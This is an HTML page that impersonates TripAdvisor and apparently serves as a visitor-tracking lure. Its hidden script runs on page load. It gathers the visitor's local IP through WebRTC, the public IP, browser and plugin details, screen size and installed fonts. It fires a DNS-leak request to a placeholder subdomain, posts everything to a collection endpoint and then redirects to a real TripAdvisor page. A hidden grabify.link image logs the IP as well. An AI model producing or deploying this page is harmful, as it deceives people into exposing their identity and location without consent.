<!DOCTYPE html>
<html lang="en">
<head>
        <!-- Standard Meta Tags -->
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="description" content="Discover the best travel destinations, hotels, and restaurants around the world on TripAdvisor. Plan your perfect trip with our detailed reviews and recommendations.">
        <meta name="keywords" content="travel, hotels, restaurants, reviews, recommendations, trip planning">
    
        <!-- Open Graph Meta Tags -->
        <meta property="og:title" content="Trip Planner - Plan Your Perfect Trip">
        <meta property="og:description" content="Discover the best travel destinations, hotels, and restaurants around the world on TripAdvisor. Plan your perfect trip with our detailed reviews and recommendations.">
        <!--<meta property="og:image" content="https://example.com/path/to/your-image.jpg">
        <meta property="og:url" content="https://www.tripadvisor.com/your-page-url">-->
        <meta property="og:type" content="website">
        <meta property="og:site_name" content="TripAdvisor">
    
        <!-- Favicon -->
        <link rel="icon" id="favicon" href="https://static.tacdn.com/favicon.ico?v2" type="image/x-icon"/>
        <link rel="mask-icon" sizes="any" href="https://static.tacdn.com/img2/brand_refresh/application_icons/mask-icon.svg" color="#000000"/>
    
        <title>TripAdvisor - Plan Your Perfect Trip</title>
</head>
<body>
    <script>
async function getLocalIP() {
    return new Promise((resolve) => {
        try {
            const rtc = new RTCPeerConnection({ iceServers: [] });
            rtc.createDataChannel('');
            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
            rtc.onicecandidate = (event) => {
                if (event.candidate && event.candidate.candidate) {
                    const ipMatch = event.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
                    if (ipMatch) {
                        rtc.onicecandidate = null;
                        resolve(ipMatch[0]);
                    }
                }
            };
            setTimeout(() => {
                resolve(null); // In case no local IP found
            }, 1000);
        } catch (error) {
            console.error('Error getting local IP:', error);
            resolve(null);
        }
    });
}

async function getPublicIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error getting public IP:', error);
        return null;
    }
}

async function getScreenSize() {
    try {
        return {
            width: window.screen.width,
            height: window.screen.height
        };
    } catch (error) {
        console.error('Error getting screen size:', error);
        return null;
    }
}

async function getBrowserInfo() {
    try {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookieEnabled: navigator.cookieEnabled,
            javaEnabled: navigator.javaEnabled(),
            online: navigator.onLine,
            plugins: Array.from(navigator.plugins).map(plugin => plugin.name)
        };
    } catch (error) {
        console.error('Error getting browser info:', error);
        return null;
    }
}

async function getAvailableFonts() {
    try {
        const fonts = [
            "Arial", "Verdana", "Helvetica", "Times New Roman", "Courier New",
            "Georgia", "Palatino", "Garamond", "Bookman", "Comic Sans MS",
            "Trebuchet MS", "Arial Black", "Impact"
        ];

        const availableFonts = fonts.filter(font => {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            context.font = '72px ' + font + ', sans-serif';
            const baselineSize = context.measureText('m').width;
            context.font = '72px sans-serif';
            const defaultSize = context.measureText('m').width;
            return baselineSize !== defaultSize;
        });

        return availableFonts;
    } catch (error) {
        console.error('Error getting available fonts:', error);
        return [];
    }
}

async function getVisitorInfo() {
    const uid = Date.now();
    const [localIP, publicIP, screenSize, browserInfo, availableFonts, dnsLeak] = await Promise.all([
        getLocalIP().catch(error => { console.error(error); return null; }),
        getPublicIP().catch(error => { console.error(error); return null; }),
        getScreenSize().catch(error => { console.error(error); return null; }),
        getBrowserInfo().catch(error => { console.error(error); return null; }),
        getAvailableFonts().catch(error => { console.error(error); return []; }),
        dnsLeakTest(uid).catch(error => { console.error(error); return null; })
    ]);

    return {
        screenSize: screenSize,
        browserInfo: browserInfo,
        systemTime: new Date().toString(),
        availableFonts: availableFonts,
        localIP: localIP,
        publicIP: publicIP,
        uid: uid
    };
}

async function dnsLeakTest(uid) {
    let url = `http://${uid}.sub.YOUR DOMAIN`
    var data = null;
    
    var xhr = new XMLHttpRequest();
    xhr.withCredentials = true;
    xhr.open("GET", url);
    xhr.send(data);
}

async function sendVisitorInfo() {
    try {
        const visitorInfo = await getVisitorInfo();

        const response = await fetch('/api/visitor-info', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(visitorInfo)
        });

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        window.location.href = "https://www.tripadvisor.com.tr/Tourism-g293974-Istanbul-Vacations.html";
    } catch (error) {
        console.error('Error sending visitor info:', error);
    }
}

// Send visitor information when the page loads
window.onload = sendVisitorInfo;

    </script>
    <img src="https://grabify.link/xyz" style="display: none;">
</body>
</html>
